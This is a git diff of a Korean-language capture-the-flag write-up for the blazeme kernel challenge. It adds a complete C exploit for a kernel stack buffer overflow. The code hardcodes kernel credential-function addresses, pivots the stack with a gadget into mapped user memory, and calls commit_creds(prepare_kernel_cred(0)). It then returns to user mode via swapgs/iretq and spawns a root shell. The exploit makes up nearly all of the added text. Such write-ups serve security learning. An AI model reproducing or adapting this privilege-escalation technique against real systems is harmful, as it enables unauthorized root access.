@@ -432,9 +432,92 @@ strncat 위치에서 kernel stack overflow가 떴다.
 
 # 4. Exploitation
 
-Kernel Stack BOF를 통해 rip를 제어할 수 있게 되었으므로 간단한 
+Kernel Stack BOF를 통해 rip를 제어할 수 있게 되었으므로
 
+## 추가중
+**Final Exploit Code**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/mman.h>
 
+struct TrapFrame{
+	void* rip;
+	unsigned long user_cs;
+	unsigned long user_rflags;
+	void* rsp;
+	unsigned long user_ss;
+} __attribute__((packed));
+
+void *(*prepare_kernel_cred)(void *);
+int (*commit_creds)(void *);
+struct TrapFrame tf;
+
+// commit cred
+static void lpe() {commit_creds(prepare_kernel_cred(0));}
+
+// get shell
+static void shell() {
+	system("/bin/sh");
+	exit(0);
+}
+
+static void save() {
+	asm(
+		"xor %rax, %rax;"
+		"mov %cs, %ax;"
+		"pushq %rax; popq tf+8;"
+		"pushfq; popq tf+16;"
+		"pushq %rsp; popq tf+24;"
+		"mov %ss, %ax;"
+		"pushq %rax; popq tf+32;"
+	);
+	tf.rip = &shell;
+	tf.rsp = 0x5DFF0000;
+}
+
+static void restore() {
+	asm(
+		"movq $tf, %rsp;"
+		"swapgs ;"
+		"iretq;"
+	);
+}
+
+static void root_shell() {
+	lpe();
+	restore();
+}
+
+int main() {
+	commit_creds = (void*)0xFFFFFFFF81063960ull;
+	prepare_kernel_cred = (void*)0xFFFFFFFF81063B50ull;
+	save();
+	// 0xffffffff814d2720: mov esp, 0x5DFFB7B0 ; ret  ;  (1 found)
+	unsigned long *mem = mmap((void*)0x5DFF0000, 0x10000,
+	PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
+	mem[0xB7B0 / 8] = (unsigned long)root_shell;
+
+	unsigned long gadget[8];
+	for(int i=0;i<8; ++i)
+	gadget[i] = 0xffffffff814d2720ull;
+
+	char chunk[64];
+	strncpy(chunk, "AA", 2);
+	strncpy(&chunk[2], (const char *)gadget, 62);
+
+	int fd = open("/dev/blazeme", O_RDWR);
+	while(1) {
+		write(fd, chunk, 64);
+	}
+
+	return 0;
+
+}
+```
 
 # 5.References
 [blazeme write-up] <https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html>
